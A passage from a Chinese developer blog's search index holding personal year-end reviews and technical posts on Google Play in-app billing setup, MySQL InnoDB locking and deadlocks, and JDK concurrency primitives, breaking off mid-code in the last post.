Quick-Crawle爬虫框架:https://github.com/liuyueyi/quick-crawler，很久很久以前就对爬虫感兴趣了，然后就从0到1构建了一个非常简单的爬虫框架，前面说的《古诗选》的内容，就是通过这个爬虫框架从网上爬下来的，从玩票的性质来看，还不错； Quick-Media多媒体服务:https://github.com/liuyueyi/quick-media，目前算是个人最多star的项目了，里面深度的刨析了一下二维码的生成，完全可以替换二维码上各种元素，当然还有一些其他的东西，这个项目算是工作的附属品，因为实际的工作中，很多服务都是不需要的，但是偶尔我个人会对某一块比较感兴趣，所以干脆新搞了一个，把自己平时的各种想法都丢上去尝试一下； quick-doraemon，一个基于redis实现的配置中心框架:https://github.com/liuyueyi/quick-doraemon，了解阿里的Diaemond的同学大概可以猜到这个是干嘛的，做这个，纯粹是为了探究一下一个配置中心的实现，到底需要些什么东西，最关键的是，这个实现简不简单； 另外还有两个小工具包，一个是基于PopClip的 https://github.com/liuyueyi/PopClip， 一个基于Alfred的小工具集合（目前没有对外开放，主要扔在了公司内网，有较多的内部信息） 出去跑了个步，都接不下来上面写的东西了，干脆直接换个话题，谈谈生活。然而仔细想了想，好像没啥好说的，基本上就是上班，晚上加班，回家睡觉，第二天继续上班；这日子，过得有点单调啊。自勉，18年不能这么下去了，好歹也得有点业务生活，出去逛逛圈，到处走走也好过每天死宅 17年，家庭新增了两个成员，不到一岁的小朋友，老大已经会走路了，而老二则处于只晓得吃吃喝喝的状态；小外甥的成就已经远远超过他们老舅我的状态了，听我妈说两岁多我都还不会走路，也是尴尬; 多了小朋友之后，还挺不错的，最近没什么事情就喜欢在淘宝，京东上看一些小朋友的玩具，各种积木，玩具车之类的，发现还蛮有意思的，小时候没有玩过的东西，完全可以借着小朋友的名头买来自己耍，也是不错；一直都不太喜欢小孩子，总觉得难以沟通，还挺麻烦，但看着老爸老妈，每天教他们的大外甥一些东西的时候，还是蛮有趣的，陪伴与成长，如果可以的话，父母还是需要和小孩子一起 17年花了所有的积蓄，借了一些，方才勉强凑够首付，贷款了个小破房，生活艰辛，唉，啥时候房价才能平民，千年前的“安得广厦千万间，大庇天下寒士俱欢颜”放在现在，依然有效；脑子不够灵活，只能拿点死工资，得开拓下自己的思路了。 感谢@美人姣的这一路的相伴，虽然生活过得比较平淡，没有那么多的惊喜，没有那么多的浪漫，这些主要都是我的原因了，得改正，该有的小惊喜还是得有的，拓宽一下思路，改变一下习性，让生活变得有意思起来，这个需要在18年好好培养。 最后，再憧憬下18年，定个小目标，该结婚过小日子了!!! @美人姣","link":"/hexblog/2018/01/17/2017年全年回顾小结/"},{"title":"2018年全年回顾小结","text":"春来暑往，又一年过去了，特意翻了一下去年的总结，也是拖延到1月17号写的；今年却是更晚😭。年度总结，现在想来，这一年也发生了不少的事情，18年也算是人生的一个转折点。 先说说工作吧，年初从带了两年多的蘑菇街离职回了武汉。从15年毕业开始，第一份工作，学习和收获了很多。开始记录博文、开始写自己的开源项目也是在这期间启动的。17年算是意识到不能再做咸鱼的一年，而18年则是在努力往非咸鱼的路上前进的一年。看了下18年写的东西，挺多，覆盖面也不少，但新的技术栈却不太多。这也是19年需要补齐的事情。 回武汉待了也有大半年了，新的团队并不大，但可以学习的东西确实不少。虽然说武汉的环境和氛围相比杭州来说还是有不小的差距，但从技术本身出发，哪里有挑战，哪里就有机遇。以前没什么机会接触的中间件系统，现在也可以深入了解一下；以前一些成熟的配套系统，现在也可以尝试着自己来搭建完善一下；在9月的时候，开了个坑，计划着全面的学习一下Spring/SpringCloud的生态体系，之前只是处于业务开发，会用一些基本的功能，总不能一直这么low下去了，毕竟也是工作了三四年的老同学了，如果不给自己一点要求，人就真的平庸下去了。希望在今年9月之前，把既定的Spring的学习目标，都过一遍，挖的坑也要自己来填。 17年的开源项目，目前来看还活着的是quick-media，基于蘑菇街的多媒体处理场景衍生出来的一个项目，当时对多媒体的处理比较感兴趣，但是实际又没有业务场景，所以就开了这个坑；在18年主要是调整了下项目结构，抽象了更通用的maven包，可以简单的供第三方项目直接引入使用；目前处于bug维护阶段。目前的感慨就是，没有业务驱动的项目，维持更新的难度真心不不小；18年的话，做了三个相对大一点的项目 quick-alarm，一个简单的报警通用框架，18年年初做的，最大的特点就是可以自定义各种不同的报警规则，然后将多种报警方式结合起来，设置报警的重要程度，然后实现分级别的报警，目前基本上放着躺尸了… 另外两个quick-task 和quick-fix 两个项目，则主要用于解决后端的问题定位和数据订正，跑脚本任务；新的公司目前处于创业阶段，基础设施还不完善，因此当出现线上问题时，如何定位分析、如何修复数据就是个难点了。这两个项目将会持续跟进，目标是希望能搭建一个完善的java辅助工具链，可以查看应用中的各种数据、执行应用的方法，通过数据来还原问题现场；此外就是批量的数据订正，这里就希望实现动态语言的效果，选择了groovy作为任务脚本，支持热加载。目前在生产环境中已经应用，但使用起来还不太顺畅，需要持续修改 18年还开了一个坑，也就是前面说到的Spring全家桶的学习，目前单独搭建了一个博客网站 spring.hhui.top, 所有的源码都维护在 spring-boot-demo 这个项目中，19年的目标，就是在年底前，覆盖所有的spring知识点，如果能深入到源码解析篇，就更好了 在技术方面，18年的改进不是特别明显，虽然目前能解决基本的业务需求，对于一些复杂一点的问题也能hold住，在源码和架构设计的能力上有些欠缺，预定的netty框架没有学，打算深入的mybatis也没有看，19年不能再拖下去了。18年定的另外一个目标，努力学习一门前端语言，目前对于react可以不熟练的使用，对于简单的套一套页面，调下样式，虽然有些费力，但也可以做下去；在这个过程中，唯一的感叹就是没有实际项目驱动的学习，效率真的不高；另外终于有机会学习python了，”人生苦短，我学python“，在18年底开始介入，维护公司仅存的一个python项目，感触就是python库相当丰富，语言也特别灵活，如果想简简单单的使用，倒还好，但是想要深入接触点核心，得花一些时间和经历，写得多了之后，在解决某些问题的效率方面，动态语言真的有优势很大。 此外18年，算上发布出来和没有发布的，差不多有两百篇博文了，回头看看还挺自豪的。目前博文涉及的面也逐渐丰富起来，包括java,spring,shell,mysql,python,js,css等基础语言框架，也有一些问题定位和采坑记录，当再次遇到相同的问题时，到自己的博文里面检索一下，找到解决方法时，感觉还挺nice。19年当然得持续保持，更需要提升的是质量方面，努力做到将一些知识点，深入简出的写出来，这是个考验，多学习一下大神的写法，补齐自己的短板 18年，暴露了一个严重的短板，就是不善于表达。这个其实一直都在，以为性格比较内向，不爱说话，也不擅长说话，因此如何将自己的想法表达出来，传递给他人，是一个难点。有时候在做分享时，一个东西自己清楚，但是讲不出来，感觉很糟糕。归根结底，还是想象力匮乏，细致的观察下生活，将技术问题通过生活中普通的事情进行类比，今年的小目标就是能够将一些专业的问题，解释给非专业的同学（比如姣姣童鞋），以让他们理解的程度作为标准。 前段时间买了不少书，有关于如何思考培养逻辑思维的，有如何处理人际关系与人有效沟通的，也有经济学、历史、童话等类型，多读书，也要抽出时间读书。书如果只读不思考的话，基本上算是白读了，很次目标就是每本书，读完了，都得有读书笔记和感想收货输出。 锻炼身体，在18年给中断了，真心感觉没有一些处罚措施，存靠自觉的驱动，挺难。19年得改变，每周必须锻炼一次，以出汗为标准，如果没有达到，罚款200给老婆大人，立贴为证 最后，谈一下这一年的生活，从杭州回到武汉，主要是因为家庭的原因，长期的异地，加上父母年迈，不再身旁，当有点事情时，也不太方便。5月回来，大半年，武汉还是之前的样子，到处在修路建房子，修路建房子。空气不太好，交通也不好，人流多，公交司机的脾气依然没有太大的改善。但好的一点就是吃的多，基本上在哪里都可以看到小摊，不像杭州，找个吃的得好久。当然最好的是不再独自一人了，每天下班之后也有了期待，除了工作也有了生活。周末一起逛逛街，看看电影，吃个饭，或者宅在家里一起看电视，感觉也多了不少的生趣。报了驾校，目前过了科目二，年后争取最快的速度拿到驾照， 两个小外甥，也差不多两岁了，老大在家呆了一年多，每次回去都能看到精力旺盛得过分的小朋友，以后如果有小孩，还是希望是女孩得好；今年回家的次数比较多，真切的感觉到成长了之后，有太多的不容易。虽然相隔不远，但每次来去匆匆，在家的轻松，离开的不舍，还是希望19年能多回家，陪陪父母爷爷奶奶。另外知道说道的就是终于结束5年的爱情长跑，和美丽的姣姣同学步入下一步阶段，11月28号，从此在余下的岁月中被标记出来。我不知道能不能处理好一个新的角色，19年，要努力工作，健康生活。 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/22/2018年全年回顾小结/"},{"title":"200817-谷歌内购服务教程与避雷指南","text":"最近客串了一把android开发，对接谷歌的内购商品，这个过程真的是特别不顺，各种意想不到的坑，一踩一个； 接下来记录一下谷歌内购服务的完整配置流程，以及在最后测试阶段可能遇到的各种问题；在正式开始之前，请确定以下基本条件 科学上网 准备gmail邮箱 准备google play账号（地区不要选择中国大陆，因为不支持购买） 授权开启商家账号 准备测试机（谷歌服务四件套得有） 1. 内购服务前置授权配置进入链接，开启api accesshttps://play.google.com/apps/publish/#ApiAccessPlace 接着点击上面的创建服务账号 接下来再新的窗口页，点击创建服务账号 创建服务账号有三步，第一步如下，填写标记的两项 第二步设置账号权限，下面勾选结算功能，请注意一下用户权限，选错的话，服务器后续的校验可能会403报错哦 第三步，服务账号授权，注意账号就是我们第一步生成的，输入bill会出现一个候选框，选中即可 上面完成之后，会多一个服务账号，接下来创建密钥, json/p12按需选择 比如我选择了p12之后，再进入详情，可以看到如下基本信息，在后续内购订单的确认中，服务端会用到这个电子邮件地址 + 上面下载的p12文件 (请注意，本文的所有配置只是为了演示，弄完之后就删除了，所以不要用这些信息来搞事情哦) 上面服务账号配置完毕之后，回到前面的页面，点击完成 点击完成之后，会自动刷新，出现下面这一行，点击授予访问权，在弹出中选中需要授权的应用 在下面的演示中，给的是管理员权限，并选中了app 如果我们的内购商品是订阅类型，即支持自动续订，那么我们还需要额外的消息推送配置，比如自动续订之后，回调一下服务器，告诉续订成功，接下来进入相关配置 下面的操作来自于文档：https://cloud.google.com/pubsub/docs/quickstart-console 我们在快速入门中，点击设置项目，选中google play android developer 接下来进入Pub/Sub主题页，即https://console.cloud.google.com/cloudpubsub/topicList来创建主题 创建完毕之后，会自动进入主题详情页，拉到最下面，创建订阅 在订阅中，填写必要信息，比如订阅id，我这里选择的是推送方式，因此需要填写接收推送的url topic创建完毕之后，需要授予权限 选择添加成员，`google-play-developer-notifications@system.gserviceaccount.com，角色为Pub/Sub Publisher` 保存之后，进入主题，点击刚才创建的billing，进入详情，找到下面红框的内容，复制到粘贴板 接下来进入google play console，找到对应的项目，进入服务和API 将我们前面的内容，复制到输入框，点击保存，也可以发送测试通知，看一下配置的url是否能收到内容 新版的控制台，已经没有上面这个入口，可以直接在创建订阅的界面，点击发布消息进行测试 在上图中，上面的终端显示的就是google的回调，因为我是随便配置的一个url，所以不会正常返回200状态，所以会重试（关于这个消息的重试机制，推荐选择阶梯重试方式，避免立即重试） 以上所有的配置，请注意这些都是谷歌内购商品的前提操作，这些搞完之后，还有一些操作等待着你 2. 商品配置 这里应该是最简单，坑最少的地方了 接下来进入google play console https://play.google.com/apps/publish，进行内购商品配置 请注意，应用内商品需要商家账号，开通流程没什么可说的，这里注意一下，受管理的商品和订阅是两种类型 受管理的商品：即消费型商品，一次一次的买 订阅商品：支持续订，举例如视频的月卡，开通之后，下个月自动扣钱续订（可以有效地赚钱） 创建收管理的商品，比较简单，唯一需要注意的是商品ID，不能与之前的有冲突，而且某个商品即便删除了，其商品id也是依然不能再用的；其次就是需要将状态改为有效 订阅商品创建姿势和上面基本一致，会多一个结算周期；请注意，订阅商品创建之后不能删除（至少我没有找到删除的地方） 3. 代码集成接下来就是android端集成对应的代码，按照文档一步一步来，官方文档在接入代码这里，写得比较清晰，主要的问题会在后面的测试环节 中文接入文档: https://developer.android.com/google/play/billing/billing_library_overview?hl=zh-cn#Connect 英文接入文档: https://developer.android.com/google/play/billing/integrate 4. 测试下面介绍下我们在测试这里踩过的坑 a. 首次提内测包需要过审在测试之前，先要发包到alpha或者beta环境 注意：正式包 + 正式签名 + 版本号 首次发包需要审核，即便发的是内测包也需要审核（请注意预留足够的时间） b. 签名问题请注意，用于测试购买的包，有以下几点非常重要 测试的apk包名，要求与上面提包的包名要求一致 测试的apk签名，要求与上面提包的前面一样 测试的apk版本号，要求大于or等于上面提包的版本号 c. 测试机测试机上，google的基础服务要有 Google框架服务 谷歌账号管理 Google Play服务 Google Play商店 c. Google Play In-app Billing API version is less than 3上面这个错误有很大的迷惑性，直接升级billingclient版本是并没有什么用的，出现这个问题，95%的可能性是因为你的google账号的地区是中国，而中国地区的账号是不支持购买的 要避免这个问题，就是换个地区不是中国的账号；或者切换一下账号位置（但是这个切换的条件，没有那么容易） d. Fatal error during the API action在于谷歌服务建立连接之后，查询Sku列表的时候，可能报这个问题，返回状态码为6 出现这个问题，一般是两个原因 google play商店能否正常打开 手机是否翻墙（简单来讲，就是测试机的网络归属，不要是大陆） e. SkuType.INAPP 与 SkuType.SUBS请注意，在查询Sku信息时，传入的producetId与SkuType请对应起来，对应错了就查不到对应的sku信息 消耗性商品，查询sku时，选择SkuType.INAPP 订阅性商品，查询sku时，选择SkuType.SUBS f. 商品确认对于订阅性商品，用户购买了，也付了钱，但是这笔订单并不能表示完成了，这个时候需要确认 对于订阅型商品，下面的billingClient.acknowledgePurchase这一步必不可少 对于一次性商品，则是billingClient.consumeAsync，注意他们的区别，不要混用 关于上面两个确认的截图中，Listener内部的实现非必要，一般来讲校验是否购买成功这件事情，推荐放在服务器端来做一个校验，如果完全信赖客户端的返回结果，会遇到什么问题各位小伙伴应该也能想到 g. 无法购买您要买的商品请确保google账号在测试名单中 e. 此版本的应用未配置为通过google play结算首先确保，当前测试的包与提交到谷歌控制台的包签名 + 包名 + 版本一致 如果上面没有问题，可以尝试如下操作 设置-&gt;账号详情-&gt;许可测试 添加测试账号 IV. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/08/17/200817-谷歌内购服务教程与避雷指南/"},{"title":"210207-MySql并发插入死锁引来的锁分析","text":"最近遇到一个由于唯一性索引，导致并发插入产生死锁的场景，在分析死锁产生的原因时，发现这一块还挺有意思的，涉及到MySql中不少的知识点，特此总结记录一下 I. MySql常见的锁谈到mysql的锁，可以说的就比较多了，比如行锁、表锁、页锁、元数据锁等，当然我们这里没打算把所有的都细列出来，我们这里主要针对行锁、gap锁进行拓展，以方便分析第二节中，为什么并发插入同样的数据会产生死锁的问题 0. 锁分类我们最常说的锁，可以区分为共享锁(S)和排它锁(X)，在mysql的innodb引擎中，为了解决幻读问题，引入了gap锁以及next key lock；除此之外，还有一种意向锁的，比如插入意向锁 本文将主要介绍的以下几种锁 行锁(record lock): 请注意它是针对索引的锁（所以如果没有索引时，最终行锁就会导致整个表都会被锁住） 共享锁(S Lock): 也叫读锁，共享锁之间不会相互阻塞（顾名思义） 排它锁(X Lock): 也叫写锁，排它锁一次只能有一个session（或者说事务？）持有 间隙锁(gap lock): 针对索引之间的间隙 Next-key锁（Next-key lock)：可以简单理解为行锁 + 间隙锁 上面虽然介绍了几种锁的基本定义，但是什么时候是行锁，怎样获取共享锁，排它锁又是在哪些场景下会产生呢？gap lock/next key lock又是怎样解决幻读的呢？ 下面所有的都是基于mysql5.7.22 innodb引擎，rr隔离级别进行说明 1 共享锁与排它锁下表介绍我们的实际使用的sql中，是否会使用锁，以及会产生什么锁 共享锁与排他锁区分 sql 示例 说明 select ... where select * from table limit 1 基于MVCC，快照读，不加锁 select ... for update select * from table where id=1 for update 排他锁 select ... lock in share mode select * from table where id=1 lock in share mode 共享锁 update ... where update table set xx=xx where id=1 排他锁 delete ... where delete table where id=1 排它锁 2. 行锁、表锁、gap锁、next-key锁区分这几个的区分，主要就是看我们最终锁住的效果，如 没有索引，加S/X锁最终都是锁整表 （为啥？因为锁是针对索引而言的） 根据主键/唯一键锁定确定的记录：行锁 普通索引或者范围查询：gap lock / next key lock 行锁和gap锁之间最大的区别是： 行锁针对确定的记录 间隙锁的是两个确定记录之间的范围； next key lock则是除了间隙还包括确定的记录 3. 实例演示看上面的两个说明，自然就想在实际的case中操刀分析一下，不同的sql会产生什么样的锁效果 针对表中一条确定的记录加X锁，是只有行锁嘛？ 针对表中多条确定的记录加X锁，又会怎样？ 针对表中一条不存在的记录加X锁，会有锁产生嘛？如果是gap锁，那区间怎么定？ 针对范围加X锁，产生的gap锁范围怎么确定呢？ 在分析上面几种case之前，我们得先有一个概念，锁是针对索引而言的，这一点非常非常重要 其次不同的索引，我们需要分别进行测试（其实就是唯一索引与普通索引） 3.1 表准备接下来针对上面的四种场景，设计我们的测试用例，首先我们准备三张表 无索引表 TN 唯一索引表 TU 普通索引表 TI 对应的表结构和初始化数据如下 1234567891011121314151617181920212223CREATE TABLE `tn` ( `id` int(11) unsigned NOT NULL, `uid` int(11) unsigned NOT NULL) ENGINE=InnoDB;CREATE TABLE `tu` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `uid` int(11) unsigned NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `u_uid` (`uid`)) ENGINE=InnoDB;CREATE TABLE `ti` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `uid` int(11) unsigned NOT NULL, PRIMARY KEY (`id`), KEY `u_uid` (`uid`)) ENGINE=InnoDB;INSERT INTO `tn` (`id`, `uid`) VALUES (1, 10), (5, 20), (10, 30);INSERT INTO `tu` (`id`, `uid`) VALUES (1, 10), (5, 20), (10, 30);INSERT INTO `ti` (`id`, `uid`) VALUES (1, 10), (5, 20), (10, 30); 3.2 精确匹配即我们的sql可以精确命中某条记录时，锁情况如下 实例 TN TU TI select * from tx where uid=20 for update 锁全表 行锁 uid=20 行锁uid=20, gap锁uid=[10, 30) 请注意上面的结论，无索引时锁全表好理解，但是普通索引的TI表，居然还有一个[10, 30)的gap锁就有点超乎我们的想象了； 接下来我们验证一下 上图基本流程如 从上面的实测也可以看出，普通索引下添加x锁，居然会加一个gap锁，而且这个gap区间是前一个记录（并包含它），到下一个记录 如 uid = 20， 前后两个记录为(1, 10), (10, 30) gap lock: 范围为 [10, 30) 因此无法插入uid=[10,30) 注意，uid=10上有gap锁只是不能插入记录，但是加X锁是没有问题的（有兴趣的可以测试一下） 3.3 精确查询未匹配当我们锁的记录不存在时，锁情况如下 实例 TN TU TI select * from tx where uid=25 for update 锁全表 gap lock uid=(20,30) gap lock uid=(20, 30) 实测case如下(TN省略，锁全表的没啥测试必要性) 基本流程就不画图了，上面图中已经文字描述了 从上面的测试也可以看出，uid=30没有被锁住，这里只在uid=(20, 30)这一区间添加了gap锁 唯一索引与普通索引表现一致，会阻塞insert的插入意向锁（后面说这个东西） 3.4 范围查询当我们锁一段区间时，锁情况如下 实例 TN TU TI select * from tx where uid&gt;15 and uid&lt;25 for update 锁全表 next key lock uid=(10,30] next key lock uid=(10, 30] 简单来说，范围查询时，添加next key lock，根据我们的查询条件，找到最左边和最右边的记录区间 如 uid &gt; 15 and uid &lt; 25，找到的记录是 (1, 10), (10, 30) gap锁为(10, 30) next key lock会为右边添加行锁，即uid=30加X锁 因此针对uid=30记录加锁会被阻塞（但是针对uid=28,29加x锁则不会被阻塞，插入会，有兴趣的小伙伴可以实测一下） 说明:范围加x锁时，可能锁住不再这个区间的记录，一不小心可能导致死锁哦 3.5 小结在RR隔离级别中，我们一般认为可以产生锁的语句为: SELECT ... FOR UPDATE: X锁 SELECT ... LOCK IN SHARE MODE: S锁 update/delete: X锁 索引 场景 锁范围 无索引 S/X锁 锁全表 唯一索引 精确匹配，且命中 行锁 唯一索引 精确匹配，未命中 gap lock 唯一索引 范围查询 next key lock (上个记录下个记录的区间，左闭右开） 右边记录行锁 普通索引 精确匹配，且命中 行锁 + gap lock (上一个记录和下个记录区间，左闭右开，左边记录非行锁) 普通索引 精确匹配，未命中 gap lock 普通索引 范围查询 next key lock 4. 锁冲突上面介绍了不同场景下会产生什么样的锁，但是看完之后会有一个疑问，针对行锁其他会话竞争的时候，可以按照X/S锁的规则来，但是这个GAP LOCK貌似只针对insert有效，insert除了加X锁之外是不是还有其他的特殊逻辑？ 4.1 插入意向锁插入意向锁其实是一种特殊的 gap lock，但是它不会阻塞其他锁。假设存在值为 4 和 7 的索引记录，尝试插入值 5 和 6 的两个事务在获取插入行上的排它锁之前使用插入意向锁锁定间隙，即在（4，7）上加 gap lock，但是这两个事务不会互相冲突等待；但是如果这个区间存在gap lock，则会被阻塞；如果多个事务插入相同数据导致唯一冲突，则在重复的索引记录上加读锁 简单来说，它的属性为： 它不会阻塞其他任何锁； 它本身仅会被 gap lock 阻塞 其次一个重要知识点： 通常insert语句，加的是行锁，排它锁 在insert之前，先通过插入意向锁，判断是否可以插入（仅会被gap lock阻塞） 当插入唯一冲突时，在重复索引上添加读锁 原因如下： 事务1 插入成功未提交，获取了排它锁，但是事务1最终可能会回滚，所以其他重复插入事务不应该直接失败，这个时候他们改为申请读锁（疑问点：为什么要改成读锁呢？） 4.2 锁冲突矩阵简单版矩阵 共享锁（S） 排他锁（X） 共享锁（S） 兼容 冲突 排他锁（X） 冲突 冲突 当我们将gap lock(间隙锁), next key lock(next-key锁), Insert Intention lock(插入意向锁)也加入矩阵时，就会复杂很多了 行：待加锁；列：存在锁 S(not gap) S(gap) S(next key) X(not gap) X(gap) X(next key) Insert Intention S(not gap) - - - 冲突 - 冲突 - S(gap) - - - - - - 冲突 S(next-key) - - - 冲突 - 冲突 冲突 X(not gap) 冲突 - 冲突 冲突 - 冲突 - X(gap) - - - - - - 冲突 X(next-key) 冲突 - 冲突 冲突 - 冲突 冲突 Insert Intention - 冲突 冲突 - 冲突 冲突 - 说明 not gap: 行锁 gap: gap lock next-key: gap + 行锁 小结 针对上面的矩阵，理解下面几个原则即可推导上面矩阵 gap lock只会与插入意向锁冲突 X行锁会与行锁冲突 next key lock: 行锁 + gap锁 锁区间内，插入冲突； 行锁的X锁冲突 II. 并发插入死锁分析上面属于基本知识点，接下来我们看一个实际导致死锁的case 并发插入相同记录导致死锁 0. 表准备创建一个最简单最基础的表，用于演示 123456CREATE TABLE `t` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;INSERT INTO `t` (`id`) VALUES (1); 1. 事务回滚的死锁问题场景复现: step1: 12345678910-- session1: begin; insert into t values (2);-- session2:begin; insert into t values (2);-- 阻塞-- session3:begin; insert into t values (2);-- 阻塞 step2: 12-- session1:rollback; 原因分析： 死锁日志查看 1SHOW ENGINE INNODB STATUS; step1: session1: 插入(id=2)，会添加一个X + Next Lock锁 session2/3: 插入(id=2)，插入意向锁被阻塞，改为持有S + Next Lock锁 step2: session1: 回滚，释放X锁 session2/3: 竞争X锁，只有对方释放S锁，才能竞争成功；相互等待，导致死锁 2. delete导致死锁问题和前面操作基本一致，只是第一个会话是删除记录 step1: 12345678910-- session1: begin; delete from t where id=1;-- session2:begin; insert into t values (1);-- 阻塞-- session3:begin; insert into t values (1);-- 阻塞 step2: 12-- session1:commit; 原因分析和前面基本一致 3. insert加锁逻辑insert中对唯一索引的加锁逻辑 先做UK冲突检测，如果存在目标行，先对目标行加S Next Key Lock（该记录在等待期间被其他事务删除，此锁被同时删除） 如果1成功，对对应行加X + 插入意向锁 如果2成功，插入记录，并对记录加X + 行锁（有可能是隐式锁） 根据上面这个的逻辑，那么就会有一个有意思的死锁场景 step1: 123456-- session1begin; delete from t where id = 1;-- session2begin; delete from t where id = 1; step2: 12-- session1insert into t values(1) 对应的死锁日志 关于这个场景详情博文可以参考: 记录一次Mysql死锁排查过程 4. 怎么避免死锁呢? 将大事务拆成小事务 添加合理的索引，走索引避免为每一行加锁，降低死锁的概率 避免业务上的循环等待（如加分布式锁之类的） 降低事务隔离级别（如RR -&gt; RC 当然不建议这么干） 并发插入时使用replace/on duplicate也可以避免死锁 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 相关博文 Mysql:innodb-next-key-locks [MySQL][Gap Lock][Next-Key Lock]浅析 mysql记录锁（record lock）,间隙锁（gap lock）,Next-key锁（Next-key lock）亲测 记录一次Mysql死锁排查过程 故障分析 | MySQL Insert 加锁与死锁分析 MySQL死锁日志的查看和分析 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/02/07/210207-MySql并发插入死锁引来的锁分析/"},{"title":"210412-JDK 常见并发控制手段","text":"单实例的并发控制，主要是针对JVM内，我们常规的手段即可满足需求，常见的手段大概有下面这些 同步代码块 CAS自旋 锁 阻塞队列，令牌桶等 1.1 同步代码块通过同步代码块，来确保同一时刻只会有一个线程执行对应的业务逻辑，常见的使用姿势如下 123public synchronized doProcess() { // 同步代码块，只会有一个线程执行} 一般推荐使用最小区间使用原则，尽量不要直接在方法上加synchronized，比如经典的双重判定单例模式 123456789101112public class Single { private static volatile Single instance; private Single() {} public static Single getInstance() { if (instance == null) { synchronized(Single.class) { if (instance == null) instance = new Single(); } } return instance; }} 1.2 CAS自旋方式比如AtomicXXX原子类中的很多实现，就是借助unsafe的CAS来实现的，如下 123456789101112131415public final int getAndIncrement() { return unsafe.getAndAddInt(this, valueOffset, 1);}// unsafe 实现// cas + 自选，不断的尝试更新设置，直到成功为止public final int getAndAddInt(Object var1, long var2, int var4) { int var5; do { var5 = this.getIntVolatile(var1, var2); } while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4)); return var5;} 1.3 锁jdk本身提供了不少的锁，为了实现单实例的并发控制，我们需要选择写锁；如果支持多读，单实例写，则可以考虑读写锁；一般使用姿势也比较简单 12345678910111213141516171819202122private void doSome(ReentrantReadWriteLock.WriteLock writeLock) { try { writeLock.lock(); System.out.println(\"持有锁成功 \" + Thread.currentThread().getName()); Thread.sleep(1000); System.out.println(\"执行完毕! \" + Thread.currentThread().getName()); writeLock.unlock(); } catch (Exception e) { e.printStackTrace(); }}@Testpublic void lock() throws InterruptedException { ReentrantReadWriteLock reentrantReadWriteLock = new ReentrantReadWriteLock(); new Thread(()-&gt;doSome(reentrantReadWriteLock.writeLock())).start(); new Thread(()-&gt;doSome(reentrantReadWriteLock.writeLock())).start(); new Thread(()-&gt;doSome(reentrantReadWriteLock.writeLock())).start(); Thread.sleep(20000);} 1.4 阻塞队列借助同步阻塞队列，也可以实现并发控制的效果，比如队列中初始化n个元素，每次消费从队列中获取一个元素，如果拿不到则阻塞；执行完毕之后，重新塞入一个元素，这样就可以实现一个简单版的并发控制 demo版演示，下面指定队列长度为2，表示最大并发数控制为2；设置为1时，可以实现单线程的访问控制 12345678910111213141516171819202122232425262728293031AtomicInteger cnt = new AtomicInteger();private void consumer(LinkedBlockingQueue&lt;Integer&gt; queue) { try { // 同步阻塞拿去数据 int val = queue.take(); Thread.sleep(2000); System.out.println(\"成功拿到: \" + val + \" Thread: \" + Thread.currentThread()); } catch (InterruptedException e) { e.printStackTrace(); } finally { // 添加数据 System.out.println(\"结束 \" + Thread.currentThread()); queue.offer(cnt.getAndAdd(1)); }}@Testpublic void blockQueue() throws InterruptedException { LinkedBlockingQueue&lt;Integer&gt; queue = new LinkedBlockingQueue&lt;&gt;(2); queue.add(cnt.getAndAdd(1)); queue.add(cnt.getAndAdd(1)); new Thread(() -&gt; consumer(queue)).start(); new Thread(() -&gt; consumer(queue)).start(); new Thread(() -&gt; consumer(queue)).start(); new Thread(() -&gt; consumer(queue)).start(); Thread.sleep(10000);} 1.5 信号量Semaphore上面队列的实现方式，可以使用信号量Semaphore来完成，通过设置信号量，来控制并发数 12345678910111213141516171819202122232425private void semConsumer(Semaphore semaphore) { try { //同步阻塞，尝试获取信号 semaphore.acquire(1); System.out.println(\"成功拿到信号，执行: \" + Thread.currentThread()); Thread.sleep(2000); System.out.println(\"执行完毕，释放信号: \" + Thread.currentThread()); semaphore.release(1); } catch (Exception e) { e.printStackTrace(); }}@Testpublic void semaphore() throws InterruptedException { Semaphore semaphore = new Semaphore(2); new Thread(() -&gt; semConsumer(semaphore)).start(); new Thread(() -&gt; semConsumer(semaphore)).start(); new Thread(() -&gt; semConsumer(semaphore)).start(); new Thread(() -&gt; semConsumer(semaphore)).start(); new Thread(() -&gt; semConsumer(semaphore)).start(); Thread.sleep(20_000);} 1.6 计数器CountDownLatch计数，应用场景更偏向于多线程的协同，比如多个线程执行完毕之后，再处理某些事情；不同于上面的并发数的控制，它和栅栏一样，更多的是行为结果的统一 这种场景下的使用姿势一般如下 重点：countDownLatch 计数为0时放行 1234567891011121314151617181920212223242526272829@Testpublic void countDown() throws InterruptedException { CountDownLatch countDownLatch = new CountDownLatch(2); new Thread(() -&gt; { try { System.out.println(\"do something in \" + Thread.currentThread()); Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); } finally { countDownLatch.countDown(); } }).start(); new Thread(() -&gt; { try { System.out.println(\"do something in t2: \" + Thread.currentThread()); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } finally { countDownLatch.countDown(); } }).start(); countDownLatch.await(); 